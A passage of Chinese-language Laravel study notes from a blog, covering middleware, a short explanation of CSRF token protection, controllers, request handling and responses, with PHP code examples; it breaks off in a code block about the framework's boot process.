code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">App</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Middleware</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">Closure</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CheckAge</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Handle an incoming request.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  \Illuminate\Http\Request  $request</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  \Closure  $next</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> mixed</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handle</span>(<span class="hljs-params"><span class="hljs-variable">$request</span>, <span class="hljs-built_in">Closure</span> <span class="hljs-variable">$next</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$request</span>-&gt;age &lt;= <span class="hljs-number">200</span>) &#123;<br>            <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$next</span>(<span class="hljs-variable">$request</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>正如你所看到的，如果请求参数中的 <code>age</code> 小于等于 200，中间件会返回一个 HTTP 重定向给客户端；否则，请求会被传递下去。将请求往下传递可以通过调用回调函数 <code>$next</code> 并传入当前 <code>$request</code>。</p><p>理解中间件的最好方式就是将中间件看做 HTTP 请求到达目标动作之前必须经过的“层”，每一层都会检查请求并且可以完全拒绝它。所有的中间都是在<a href="https://laravelacademy.org/post/21965">服务容器</a>中解析，所以你可以在中间件的构造函数中类型提示任何依赖。</p><p>具体还有<code>请求之前/之后的中间件</code>,<code>注册中间件</code>,<code>中间件参数</code>等。</p><h2 id="CSRF防护"><a href="#CSRF防护" class="headerlink" title="CSRF防护"></a>CSRF防护</h2><p>简单地说，csrf就是攻击者伪装用户来攻击授信网站。</p><p>在laravel中防护csrf用的时csrf令牌，其实就是用token或者cookie来验证请求输入的 token 值和 Session 中存储的 token 是否一致，如果没有传递该字段或者传递过来的字段值和 Session 中存储的数值不一致，则会抛出异常。</p><h2 id="控制器入门"><a href="#控制器入门" class="headerlink" title="控制器入门"></a>控制器入门</h2><p>可以通过artisan命令快速创建一个控制器</p><figure class="highlight gauss"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gauss">php artisan <span class="hljs-built_in">make</span>:controller TakeController<br></code></pre></div></td></tr></table></figure><p>该命令会在 <code>app/Http/Controllers</code> 目录下创建一个新的名为 <code>TaskController.php</code> 的文件，默认生成的控制器代码如下：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">App</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Controllers</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Request</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShowController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//该方法用于将 user 变量渲染到 user/profile 视图中。然后在 user 目录下新建 profile.blade.php 文件</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params">User <span class="hljs-variable">$user</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> view(<span class="hljs-string">&#x27;user.profile&#x27;</span>, [<span class="hljs-string">&#x27;user&#x27;</span> =&gt; <span class="hljs-variable">$user</span>]); <br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="单一动作控制器"><a href="#单一动作控制器" class="headerlink" title="单一动作控制器"></a>单一动作控制器</h4><p>用<code>__invoke</code> 方法：</p><p>例如可在上述类中定义</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> view(<span class="hljs-string">&#x27;user.profile&#x27;</span>, [<span class="hljs-string">&#x27;user&#x27;</span> =&gt; User::findOrFail(<span class="hljs-variable">$id</span>)]);<br>    &#125;<br></code></pre></div></td></tr></table></figure><p>当你为这个单动作控制器注册路由的时候，不需要指定方法：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">Route::get(<span class="hljs-string">&#x27;user/&#123;user&#125;&#x27;</span>, \App\Http\Controllers\ShowController::class);<br></code></pre></div></td></tr></table></figure><h4 id="控制器中间件"><a href="#控制器中间件" class="headerlink" title="控制器中间件"></a>控制器中间件</h4><p><code>Route::get(&#39;profile&#39;, [UserController::class, &#39;show&#39;])-&gt;middleware(&#39;auth&#39;);</code></p><p>不过，在控制器的构造函数中设置中间件更方便，你可以使用基类提供的 <code>middleware</code> 方法轻松分配中间件给该控制器的动作，你甚至可以限制中间件只应用到该控制器类的指定方法：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;middleware(<span class="hljs-string">&#x27;auth&#x27;</span>); <span class="hljs-comment">// auth 中间件会应用到所有方法 </span><br>        <span class="hljs-keyword">$this</span>-&gt;middleware(<span class="hljs-string">&#x27;log&#x27;</span>)-&gt;only(<span class="hljs-string">&#x27;index&#x27;</span>); <span class="hljs-comment">// log 中间件只会应用到 index 方法</span><br>        <span class="hljs-keyword">$this</span>-&gt;middleware(<span class="hljs-string">&#x27;subscribed&#x27;</span>)-&gt;except(<span class="hljs-string">&#x27;store&#x27;</span>); <span class="hljs-comment">// subscribed 中间件会应用到 store 之外的所有方法</span><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="资源控制器"><a href="#资源控制器" class="headerlink" title="资源控制器"></a>资源控制器</h4><p>命令创建</p><p><code>php artisan make:controller PostController --resource</code></p><p>该 Artisan 命令将会生成一个控制器文件 <code>app/Http/Controllers/PostController.php</code>，这个控制器包含了每一个资源操作对应的方法：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <br><span class="hljs-keyword">namespace</span> <span class="hljs-title">App</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Controllers</span>;<br>    <br><span class="hljs-keyword">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Request</span>;<br>    <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PostController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Display a listing of the resource.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> \Illuminate\Http\Response</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Show the form for creating a new resource.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> \Illuminate\Http\Response</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Store a newly created resource in storage.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  \Illuminate\Http\Request  $request</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> \Illuminate\Http\Response</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">store</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Display the specified resource.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  int  $id</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> \Illuminate\Http\Response</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Show the form for editing the specified resource.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  int  $id</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> \Illuminate\Http\Response</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">edit</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Update the specified resource in storage.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  \Illuminate\Http\Request  $request</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  int  $id</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> \Illuminate\Http\Response</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span>, <span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Remove the specified resource from storage.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  int  $id</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> \Illuminate\Http\Response</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">destroy</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>然后创建路由</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">Route::resource(<span class="hljs-string">&#x27;post&#x27;</span>,app/Http/Controllers/PostController.php::class);<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210705124752719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="获取用户输入"><a href="#获取用户输入" class="headerlink" title="获取用户输入"></a>获取用户输入</h4><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">Route::get(<span class="hljs-string">&#x27;task/create&#x27;</span>, <span class="hljs-string">&#x27;TaskController@create&#x27;</span>);<br>Route::post(<span class="hljs-string">&#x27;task&#x27;</span>, <span class="hljs-string">&#x27;TaskController@store&#x27;</span>);<br></code></pre></div></td></tr></table></figure><p>我们可以在<code>TaskController.php</code>中创建create方法满足我们的功能</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">store</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$task</span> = <span class="hljs-keyword">new</span> Task();<br>    <span class="hljs-variable">$task</span>-&gt;title = <span class="hljs-variable">$request</span>-&gt;input(<span class="hljs-string">&#x27;title&#x27;</span>);<br>    <span class="hljs-variable">$task</span>-&gt;description = <span class="hljs-variable">$request</span>-&gt;input(<span class="hljs-string">&#x27;description&#x27;</span>);<br>    <span class="hljs-variable">$task</span>-&gt;save();<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;task&#x27;</span>);   <span class="hljs-comment">// 重定向到 GET task 路由</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>后面还可以用门面来获取<code>input</code>.</p><h2 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h2><h4 id="访问请求实例"><a href="#访问请求实例" class="headerlink" title="访问请求实例"></a>访问请求实例</h4><p>在控制器中获取当前 HTTP 请求实例，需要在构造函数或方法中对 <code>Illuminate\Http\Request</code> 类进行依赖注入，这样当前请求实例会被<a href="https://laravelacademy.org/post/21965">服务容器</a>自动注入：</p><p><img src="https://img-blog.csdnimg.cn/20210705132809918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="依赖注入-amp-路由参数"><a href="#依赖注入-amp-路由参数" class="headerlink" title="依赖注入 &amp; 路由参数"></a>依赖注入 &amp; 路由参数</h4><p>如果还期望在控制器方法中获取路由参数，只需要将路由参数置于其它依赖之后即可，例如，如果你的路由定义如下：</p><figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-keyword">use</span> App\Http\Controllers\UserController;<br><br>Route::put(<span class="hljs-string">&#x27;user/&#123;id&#125;&#x27;</span>, [UserController::class, <span class="hljs-string">&#x27;update&#x27;</span>]);<br></code></pre></div></td></tr></table></figure><p>仍然可以对 <code>Illuminate\Http\Request</code> 进行依赖注入并通过如下方式定义控制器方法来访问路由参数 <code>id</code>：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span>, <span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br></code></pre></div></td></tr></table></figure><p>还可以在路由闭包中注入 <code>Illuminate\Http\Request</code>，在执行闭包函数的时候服务容器会自动注入输入请求：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Request</span>;<br>    <br>Route::get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>) </span>&#123;<br>    <span class="hljs-comment">//</span><br>&#125;);<br></code></pre></div></td></tr></table></figure><h4 id="获取请求路径"><a href="#获取请求路径" class="headerlink" title="获取请求路径"></a>获取请求路径</h4><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$path</span> = <span class="hljs-variable">$request</span>-&gt;path(); <span class="hljs-comment">//如果请求URL是 http://blog.test/user/1，则 path 方法将会返回 user/1</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$request</span>-&gt;is(<span class="hljs-string">&#x27;user/*&#x27;</span>))&#123;<br>    <span class="hljs-comment">//如果请求URL是 http://blog.test/user/1，该方法会返回 true。</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="获取请求-URL"><a href="#获取请求-URL" class="headerlink" title="获取请求 URL"></a>获取请求 URL</h4><h4 id="获取请求方法"><a href="#获取请求方法" class="headerlink" title="获取请求方法"></a>获取请求方法</h4><h4 id="获取请求输入"><a href="#获取请求输入" class="headerlink" title="获取请求输入"></a>获取请求输入</h4><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>上述在文档中都比较简单易懂直接看即可</p><h2 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h2><p>这块主要就是<strong>Response 对象</strong>，其他没有什么特别的</p><p>返回一个完整的 <code>Response</code> 实例允许你自定义响应的 HTTP 状态码和头信息。<code>Response</code> 实例继承自 <code>Symfony\Component\HttpFoundation\Response</code> 基类，该类提供了一系列方法用于创建 HTTP 响应：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">Route::get(<span class="hljs-string">&#x27;cookie/response&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> response(<span class="hljs-string">&#x27;Hello World&#x27;</span>, <span class="hljs-number">200</span>)<br>        -&gt;header(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/plain&#x27;</span>); <span class="hljs-comment">//添加响应头</span><br>&#125;);<br><br><span class="hljs-keyword">return</span> response(<span class="hljs-variable">$content</span>)<span class="hljs-comment">//使用 withHeaders 方法来指定头信息数组添加到响应：</span><br>    -&gt;withHeaders([<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span> =&gt; <span class="hljs-variable">$type</span>,<br>        <span class="hljs-string">&#x27;X-Header-One&#x27;</span> =&gt; <span class="hljs-string">&#x27;Header Value&#x27;</span>,<br>        <span class="hljs-string">&#x27;X-Header-Two&#x27;</span> =&gt; <span class="hljs-string">&#x27;Header Value&#x27;</span>,<br>    ]);<br><br><span class="hljs-keyword">return</span> response(<span class="hljs-variable">$content</span>)              <span class="hljs-comment">//添加 Cookie 到响应</span><br>    -&gt;header(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-variable">$type</span>)<br>    -&gt;cookie(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>, <span class="hljs-variable">$minutes</span>);<br><br>  利用辅助函数redirect重定向<br>Route::get(<span class="hljs-string">&#x27;dashboard&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;home/dashboard&#x27;</span>);<br>&#125;);<br><br>还有一些响应，视图响应，文件响应等<br>    <br></code></pre></div></td></tr></table></figure><h2 id="关于视图"><a href="#关于视图" class="headerlink" title="关于视图"></a>关于视图</h2><p>这个比较没什么特别的东西，跳过。</p><h2 id="关于核心类Kernel类"><a href="#关于核心类Kernel类" class="headerlink" title="关于核心类Kernel类"></a>关于核心类Kernel类</h2><p>vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php<br>是laravel处理网络请求的最核心类，在app容器准备好了之后，就会调用本类，之后所有的处理都在此类中。</p><p>具体参考：<a href="https://www.136.la/php/show-9877.html">https://www.136.la/php/show-9877.html</a></p><p>​                    <a href="https://www.136.la/php/show-6124.html">https://www.136.la/php/show-6124.html</a></p><p>​                    <a href="https://www.136.la/php/show-16856.html">https://www.136.la/php/show-16856.html</a></p><p>​                    <a href="https://blog.csdn.net/w13707470416/article/details/84979186?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-1&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/w13707470416/article/details/84979186?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-1&amp;spm=1001.2101.3001.4242</a></p><p>​                    <a href="https://blog.csdn.net/weixin_33916256/article/details/89063048?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/weixin_33916256/article/details/89063048?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&amp;spm=1001.2101.3001.4242</a></p><div class="hljs code-wrapper"><pre><code>            https://blog.csdn.net/imbibi/article/details/78542258?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-4&amp;spm=1001.2101.3001.4242</code></pre></div><h2 id="启动过程"><a href="#启动过程" class="headerlink" title="启动过程"></a>启动过程</h2><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span 